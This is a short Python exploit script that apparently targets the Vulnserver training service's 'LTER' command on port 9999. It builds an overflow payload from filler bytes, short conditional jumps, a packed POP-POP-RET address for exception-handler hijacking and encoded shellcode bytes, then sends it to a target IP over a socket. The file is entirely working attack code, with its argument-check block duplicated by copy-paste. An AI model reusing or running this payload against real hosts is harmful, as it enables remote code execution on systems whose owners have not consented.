#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port
# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

LJ =  b""
LJ += b"\xbe\x55\xf3\x3a\xe6\xda\xdd\xd9\x74\x24\xf4\x5f"
LJ += b"\x29\xc9\xb1\x02\x31\x77\x13\x03\x77\x13\x83\xc7"
LJ += b"\x51\x11\xcf\x0f\x1a\x27\xcf\x2f"

# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'LTER .' +
    b'A' * (3506 - 4) +
    # JNZ SHORT +0x10: Will jump if ZF is 0
    b'\x75\x08' +
    # JZ SHORT +0x8: This will only happen if the previous jump did not happen and ZF is 1
    b'\x74\x06' +
    # 0x6250184E    5F                          POP EDI
    # 0x6250184F    5D                          POP EBP
    # 0x62501850    C3                          RETN
    struct.pack('<L', 0x6250184E) +
    b'C' * 2 +
    # Align stack pointer
    LJ + 
    b'C' * (5000 - (3506 + 4 + 2 + len(LJ)))
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)